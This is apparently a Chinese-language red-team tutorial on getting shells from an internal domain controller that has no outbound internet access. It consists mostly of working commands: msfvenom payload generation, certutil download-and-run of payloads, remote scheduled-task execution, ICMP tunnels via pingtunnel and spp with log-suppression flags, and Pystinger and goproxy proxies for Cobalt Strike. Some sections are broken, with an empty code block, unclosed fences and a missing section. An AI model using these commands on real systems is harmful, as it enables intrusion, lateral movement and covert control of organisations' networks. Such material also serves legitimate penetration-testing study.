网络安全的本质是懂进攻，知防守，先正向，后逆向。一名优秀的白帽子，是不能有短板的，有的只能是很多的标准板和几块长板。

# **一、msf正向木马拿不出网域控shell**

## **msf生成木马**

```
msfvenom -p windows/x64/meterpreter/bind\_tcp lport=4444 -f raw -o msf1.bin
```

用msfvenom生成一个正向马传进去（因为无法访问外网，反向出不来），msf正向连接。

![](../Images/6a2184b4c6017280d72af64779c6deaa.png)

## **域控上线msf**

通过域控web服务的shell进行操作，域控远程下载边界跳板机上的马

```
C:\\ProgramData\\xxxx.exe -i -c "certutil -urlcache -split -f http://xxx.xxx.xxx/msf1.exe msf1.exe
```

![](../Images/f466871aa62d9a7b0b9523df5d62f7b4.png)

再通过提权工具进行执行

```
C:\\ProgramData\\xxxx.exe -i -c "msf1.exe"
```

![](../Images/438b4db81718fecc8fd7593264d90d6d.png)

msf通过代理开启监听

```
proxychains msfconsoleuse exploit/multi/handlerset payload windows/x64/meterpreter/bind\_tcpset RHOST xxx.xxx.xxxset lport 4444run
```

![](../Images/224ae1c41bf627cce643f9159e115668.png)

成功获取域控服务器的shell

![](../Images/1c3d0257ecfe378394bf82218ad4bb2c.png)

# **二、主机中转监听横向上线不出网域控**

## **设置中转监听**

![](../Images/8476dd3b337c24aa879c1df1e7920a92.png)

![](../Images/560e0d9ab373c042adb03e707d5d1140.png)

```
shell copy C:\\xxx.exe \\\\x.x.x.x\\c$

![](../Images/074c8218f4317826d1ae14c9fb4a068b.png)

运行任务，其中/i表示立即运行

```
shell schtasks /run /s x.x.x.x /u Administrator /p xxxx /tn test /i

# **三、仅ICMP出网pingtunnel上线msf&cs**

## **0\. 环境搭建**

WEB边界服务器是公司对外提供Web服务的机器，该机器可以通内网，同时向公网提供服务。内网同网段存在一台Windows内网服务器域控，Web服务器可以访问该机器远程桌面。当我们拿到web边界服务器的shell之后发现只能使用icmp协议访问公网vps（ping），所以只能用ICMP搭建通往内网的隧道，访问内网服务器域控进行后续攻击操作。

## **1\. pingtunnel**

注意，在客户端中运行一定要加noprint nolog两个参数，否则会生成大量的日志文件由于ICMP为网络层协议，应用层防火墙无法识别，且请求包当中的数据字段被加密

## **2\. vps服务端开启**

```
./pingtunnel -type server       ##开启服务器模式
```

回显0连接

![](../Images/0d5e5ceb92ddf000d1151109dbe5f0d0.png)

## **3\. 客户端开启**

```
pingtunnel.exe -type client -l 127.0.0.1:9999 -s icmpserver\_ip -t c2\_server\_ip:7777 -tcp 1 -noprint 1 -nolog 1
```

![](../Images/2e2216cc568ecf168860f3a6055144ee.png)

客户端本地监听9999端口 ，将监听到的连接流量通过icmpserver发送到vps的Linsten\_ip:7777端口执行后，kali有回显

![](../Images/31e0d6a45791d9edab3e3e95231bd23b.png)

## **4\. msf上线**

制作木马，木马的回连地址为127.0.0.1:9999,运行上线msf

```
msfvenom -p windows/x64/meterpreter/reverse\_tcp LHOST=127.0.0.1 LPORT=9999 -f exe -o msf.exe
```

![](../Images/5d9e9ebd42b4f2aef0561b308861a5e8.png)

msf开启监听

```
msfconsoleuse exploit/multi/handlerset payload windows/x64/meterpreter/reverse\_tcpset lhost x.x.x.xset lport 7777exploit -j
```

![](../Images/4937fa9dbf8c2876a5d34437a3e94636.png)

把木马msf.exe从蚁剑上传到靶机，运行

![](../Images/74e5cc5929e8186a6a196725e3548157.png)

已上线msf

![](../Images/0cc5a6124131d11e2cb85b59b6a4ed15.png)

## **1\. Server**

服务端启动

```

```

![](../Images/cc3c2fc1dde4237fbeaa9be338ea7d65.png)

客户端启动-nolog 1不输出日志，-noprint 1不打印内容

```
spp.exe -name "cs" -type proxy\_client -server x.x.x.x -fromaddr :8082 -toaddr :8081 -proxyproto tcp -proto ricmp -nolog 1 -noprint 1
```

# **五、Pystinger正向代理上线不出网域控到cs**

## **工具：**

Pystinger

## **条件：**

1.TCP、ICMP、DNS均不出网。

2.具有Web服务，并获得Webshell权限。web边界服务器在仅ICMP出网的环境下，将ICMP出网的出站规则禁用

![](../Images/0a444bd342dc36dd9a20cb272318c3e9.png)

环境机器不可以ping通其他机器

![](../Images/00da71e676aa770b2f4c8a4b5e977593.png)

## **1\. 上传代理文件**

1.通过Webshell上传Pystinger的对应语言的Webshell到目标机器，实现内网SOCK4代理， 确保http://x.x.x.x/pystinger/proxy.php可以访问，页面返回 UTF-8。

![](../Images/b7c754728cea9d9ff548058a9e49429c.png)

## **2\. 服务端运行**

参考github上Cobalt Strike多主机上线方式，上传stingger\_server.exe到目标机器，然后运行

```
start stinger\_server.exe 0.0.0.0
```

![](../Images/78df1f5c503ef33722d22dce76b4d0e9.png)

## **3\. 客户端运行**

在VPS上上传stinger\_client，-w proxy的url地址，执行

```
./stinger\_client -w http://x.x.x.x/pystinger/proxy.php -l 0.0.0.0 -p 60000
```

![](../Images/ad89c3c8f00d247a68ef8c40df35ca8b.png)

## **4\. 创建监听器**

Cobalt Strike新建监听pystinger，多主机上线设置Host为目标机器能够与更深层机器相连的内网ip：x.x.x.x，端口为60020。单主机上线设置Host为目标机器的ip：127.0.0.1，端口为60020，只能本主机上线

![](../Images/2142ec7c68df5c83654de074b9eae456.png)

## **5\. 生成木马**

![](../Images/1c700ca304f24f108665ec48fd503b44.png)

蚁剑运行木马文件

![](../Images/b1ea6db2e309872dba2218620e027954.png)

此时查看cs已上线

![](../Images/17ca34ff91bc6dcb3fa50f6fe19393d5.png)

# **六、goproxy http代理上线不出网域控到cs**

## **工具：**

goproxy

## **条件：**

1.TCP、ICMP、DNS均不出网。

2.具有Web服务，并获得Webshell权限。web边界服务器在仅ICMP出网的环境下，将ICMP出网的出站规则禁用

![](../Images/00da71e676aa770b2f4c8a4b5e977593.png)

## **1\. 上传proxy.exe**

通过Webshell上传proxy.exe到目标机器的可读可写目录，执行以下命令在这台出网主机开启一个4444端口的HTTP服务，供后面与不出网域控通讯。

```
proxy.exe http -t tcp -p "0.0.0.0:4444" --daemonnetstat -ano
```

![](../Images/4ed3d68fbdb5c11fda101ff1957620d4.png)

## **2\. 创建监听器**

Cobalt strike创建监听器，代理地址为不出网域控能访问到的地址，http://x.x.x.x:4444

![](../Images/8762ba0e8bd0ff266fec5b5c1d68bb98.png)

## **3\. 生成木马**

有效荷载选择Windows Executable(S)，不然无法上线

![](../Images/44e96b8b72e88c099260b00b552f049c.png)

然后利用蚁剑将该文件上传到web服务器供不出网域控下载使用。不出网win2008执行如下命令，要写不出网win2008同层能访问到的地址，下载CS的有效载荷。certutil -urlcache -split -f http://x.x.x.x/xxx.exe C:\\xxx.exe

![](../Images/9d2f1f94362123324f227d0e19a823c0.png)

执行木马

![](../Images/c4c49f9ac45d0439838a0482fd031c4d.png)

成功上线cs
